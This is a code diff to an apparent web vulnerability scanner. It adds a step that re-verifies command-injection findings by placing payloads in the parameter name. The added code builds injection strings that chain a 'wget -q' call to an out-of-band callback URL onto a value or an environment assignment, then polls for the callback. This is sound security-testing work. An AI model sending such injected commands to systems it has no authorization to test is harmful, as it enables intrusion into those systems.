@@ -1007,6 +1007,65 @@ class VerificationEngine:
                 base11 = ep.param(param11).value[:60]
             from .detect import CommandInjectionDetector, is_self_callback
             cd = CommandInjectionDetector(self.engine, self.bus)
+            if form11.startswith("nc-"):
+                # CM-2 (cmdi recall round, root cause A4 — the 15 name-channel
+                # FNs, live-caught on the OWASP Benchmark 8b67a88): the payload
+                # rode the parameter NAME (a resolver surface), so the replay
+                # goes through the SAME channel — the nc form THAT FIRED, with
+                # a FRESH iid and the ALTERNATE COMMAND (curl->wget, both
+                # verified present in the runtime image; for these sinks the
+                # separator cannot vary — the name is one whole token to the
+                # resolver). The rename anchor follows the XS-1 discipline:
+                # the first eligible QUERY param (value = its declared value,
+                # the resolver sentinel), else the URL's last path segment as
+                # the sentinel value (live on the Benchmark: the segment IS
+                # the test id the resolver matches; a value-mutation replay
+                # probes a channel the app never reads).
+                from .detect import _clone_ep_rename_param, last_path_segment
+                # NOTE: string-compare on location (x.location.value == "query")
+                # like the sqli/xss VR blocks — ParamLocation is not imported at
+                # this module's top level (a NameError here would silently drop
+                # the whole finding through the orchestrator's per-detector
+                # except; live-caught in the CM-2 unit trace).
+                _qp = next((x for x in ep.parameters
+                            if x.kind != ParamKind.TOKEN and not x.flow_control
+                            and x.location.value == "query"), None) if ep is not None else None
+                if _qp is not None:
+                    _anchor_nc = _qp.name
+                    _val_nc = _qp.value or "1"
+                else:
+                    _anchor_nc = (last_path_segment(ep.url) if ep is not None else "") or "nc"
+                    _val_nc = _anchor_nc
+                _base_nc = (_val_nc or "localhost")[:60]
+                iid = cd._iid(ep, _anchor_nc, "nc-verify")
+                if form11 == "nc-twin-env":
+                    payload = f"FOO=wget -q {self.oast.url(iid)} ;"
+                elif form11 == "nc-twin-direct":
+                    payload = f"wget -q {self.oast.url(iid)}"
+                else:
+                    payload = f"{_base_nc}; wget -q {self.oast.url(iid)} ;"
+                if _qp is not None:
+                    epc = _clone_ep_rename_param(ep, _qp.name, payload)
+                    rv = self.engine.send(RequestMutation(endpoint=epc, param_name=payload,
+                                                          param_value=_val_nc, note="cmdi-nc-verify"))
+                else:
+                    rv = self.engine.send(RequestMutation(endpoint=ep, param_name=payload,
+                                                          param_value=_val_nc, note="cmdi-nc-verify"))
+                hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
+                if hit and is_self_callback(hit, rv, self.oast.url(iid)):
+                    hit = None                         # ENG-08: scanner-initiated fetch
+                ok = hit is not None
+                src11 = hit[0].get("ip", "") if hit else ""
+                v = Verification(method="re-test:fresh-iid+alternate-command:name-channel",
+                                 passed=ok, confidence=0.9 if ok else 0.15, rounds=1,
+                                 notes=f"fresh id {iid} via the {form11} form as the param "
+                                       f"NAME (wget alternate command) "
+                                       f"executed out-of-band: {ok}"
+                                       f"{' src=' + src11 if src11 else ''}"
+                                       f" channel={getattr(self.oast, 'channel', 'local')}")
+                f.verification, f.confidence = v, v.confidence
+                f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
+                return f
             iid = cd._iid(ep, param11, "verify")
             if form11 == "twin-env":
                 payload = f"FOO=wget -q {self.oast.url(iid)} ;"
